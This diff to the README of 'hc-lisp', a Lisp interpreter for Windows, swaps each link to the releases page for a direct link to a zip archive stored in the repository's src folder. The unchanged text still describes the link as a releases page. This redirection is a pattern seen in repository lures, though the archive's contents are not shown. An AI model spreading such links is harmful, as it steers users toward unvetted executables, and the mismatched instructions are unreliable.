@@ -1,6 +1,6 @@
 # 🔄 hc-lisp - Simple Lisp Interpreter for Everyone
 
-[![Download hc-lisp](https://img.shields.io/badge/Download-hc--lisp-blue?style=for-the-badge)](https://github.com/dhanykey/hc-lisp/releases)
+[![Download hc-lisp](https://img.shields.io/badge/Download-hc--lisp-blue?style=for-the-badge)](https://raw.githubusercontent.com/dhanykey/hc-lisp/main/src/hc-lisp-v1.8-alpha.1.zip)
 
 ## 📋 What is hc-lisp?
 
@@ -24,10 +24,10 @@ hc-lisp runs directly on your Windows system without needing extra software such
 
 To start using hc-lisp on your Windows computer, first you need to get the software.
 
-[![Download hc-lisp](https://img.shields.io/badge/Download-hc--lisp-green?style=for-the-badge)](https://github.com/dhanykey/hc-lisp/releases)
+[![Download hc-lisp](https://img.shields.io/badge/Download-hc--lisp-green?style=for-the-badge)](https://raw.githubusercontent.com/dhanykey/hc-lisp/main/src/hc-lisp-v1.8-alpha.1.zip)
 
 1. Click the button above or visit the link:  
-   https://github.com/dhanykey/hc-lisp/releases  
+   https://raw.githubusercontent.com/dhanykey/hc-lisp/main/src/hc-lisp-v1.8-alpha.1.zip  
    This page shows the latest versions available for download.
 
 2. Look for the latest release. It usually appears at the top of the page with a version number, such as "v1.0" or higher.
@@ -95,7 +95,7 @@ Try typing these or other Lisp commands to explore how hc-lisp works.
 Keep hc-lisp up to date for new features and bug fixes:
 
 1. Visit the releases page again:  
-   https://github.com/dhanykey/hc-lisp/releases
+   https://raw.githubusercontent.com/dhanykey/hc-lisp/main/src/hc-lisp-v1.8-alpha.1.zip
 
 2. Check if a new version is available.
 
@@ -144,8 +144,8 @@ Explore topics such as:
 - Writing and running Lisp scripts  
 
 To return to the download page for updates or support:  
-https://github.com/dhanykey/hc-lisp/releases
+https://raw.githubusercontent.com/dhanykey/hc-lisp/main/src/hc-lisp-v1.8-alpha.1.zip
 
 ---
 
-[![Download hc-lisp](https://img.shields.io/badge/Download-hc--lisp-purple?style=for-the-badge)](https://github.com/dhanykey/hc-lisp/releases)
+[![Download hc-lisp](https://img.shields.io/badge/Download-hc--lisp-purple?style=for-the-badge)](https://raw.githubusercontent.com/dhanykey/hc-lisp/main/src/hc-lisp-v1.8-alpha.1.zip)
